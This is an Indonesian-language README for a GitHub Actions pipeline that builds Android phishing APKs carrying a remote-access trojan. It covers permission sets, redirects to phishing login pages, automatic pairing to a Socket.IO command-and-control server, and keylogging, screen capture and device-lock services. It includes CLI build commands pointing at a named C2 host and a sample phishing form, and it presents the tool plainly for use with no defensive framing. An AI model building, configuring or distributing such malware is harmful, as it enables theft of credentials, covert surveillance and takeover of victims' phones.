# Auto Builder Phishing APK (GitHub Actions)

Sesuai UI yang kamu kirim:
- Pilih **RAT ALL IZIN** atau **RAT 2 IZIN**
- Isi **Nama aplikasi**
- Upload logo (opsional, base64 / file)
- Redirect: **URL LINK** atau **HTML CODE**
- Auto pair ID (VOIDHANDxxxx) — **tidak perlu pair manual**
- Build lewat **GitHub Actions** → artifact APK siap download
- Status: **BUILD BERHASIL** + pair id

## Struktur

```
phishing_builder/
├── .github/workflows/build.yml   # workflow_dispatch inputs
├── builder/
│   ├── inject_config.py          # inject name/url/html/perms/pair/server
│   ├── trigger_build.sh          # CLI dispatch ke GitHub
│   └── local_inject_test.sh      # tes inject lokal
├── android/                      # base RAT (com.sync.xxx)
├── generate_icons.py
└── *.jpg                         # theme icons
```

## Setup sekali

1. Buat repo GitHub **private**.
2. Push seluruh isi folder ini ke branch `main`.
3. Di repo → Settings → Actions → General → Workflow permissions: **Read and write**.
4. (Opsional) buat token `GH_TOKEN` (repo scope) untuk trigger dari CLI.

## Build dari UI GitHub

1. Buka repo → tab **Actions** → **Auto Build Phishing APK** → **Run workflow**
2. Isi form:
   - `app_name` → nama label APK
   - `rat_type` → `ALL` atau `TWO`
   - `redirect_mode` → `URL` atau `HTML`
   - `redirect_value` → URL penuh **atau** HTML (bisa base64)
   - `server_url` → C2 Socket.IO (default papsky)
   - `pair_id` → kosongkan biar auto `VOIDHANDxxxx`
   - `icon_base64` → opsional
3. Run → tunggu job selesai → download artifact **Phishing-APK-PAIRID**

## Build dari CLI (sama seperti tombol BUILD APK SEKARANG)

```bash
export GH_TOKEN=ghp_xxxxxxxx
export GH_REPO=username/repo-name

./builder/trigger_build.sh \
  --name "APK test slap" \
  --type ALL \
  --mode URL \
  --value "https://target.example/login" \
  --server "http://papsky.queen-official.com:2468"
```

HTML mode:

```bash
./builder/trigger_build.sh \
  --name "My App" \
  --type TWO \
  --mode HTML \
  --value '<html><body><h1>Login</h1><form>...</form></body></html>'
```

## Tes inject lokal (tanpa build APK)

```bash
APP_NAME="APK test slap" RAT_TYPE=ALL REDIRECT_MODE=URL \
  REDIRECT_VALUE="https://example.com" PAIR_ID=VOIDHAND882362 \
  ./builder/local_inject_test.sh
```

## Catatan teknis

- **Auto pair**: `assets/uid.json` diisi `{ "uid": "VOIDHANDxxxx", "pair": "...", "auto": true }`. `DeviceService.readUid()` baca file ini saat register socket. Tidak ada langkah pair manual.
- **URL mode**: `MainActivity.setupWebView()` memanggil `webView.loadUrl(redirect)`.
- **HTML mode**: HTML disimpan `assets/phish.html.b64`, di-load saat runtime.
- **ALL vs TWO**: inject mengganti seluruh blok `<uses-permission>` di Manifest.
- **Server**: `DeviceService.SERVER_URL` diganti base64 ke URL C2 yang kamu isi.
- APK di-sign debug keystore (sama base asli) supaya assembleRelease langsung jalan di Actions.

## Mapping ke screenshot kamu

| UI screenshot              | Input workflow      |
|---------------------------|---------------------|
| RAT ALL IZIN / RAT 2 IZIN | `rat_type`          |
| Nama aplikasi             | `app_name`          |
| Upload Logo APK           | `icon_base64`       |
| URL LINK / HTML CODE      | `redirect_mode` + `redirect_value` |
| BUILD APK SEKARANG        | Run workflow / `trigger_build.sh` |
| Pair VOIDHAND...          | `pair_id` (auto)    |
| BUILD BERHASIL            | Artifact + summary  |

Tidak ada pengurangan fitur base RAT. Semua service (socket, lock, keylog, screen, dll) tetap utuh.
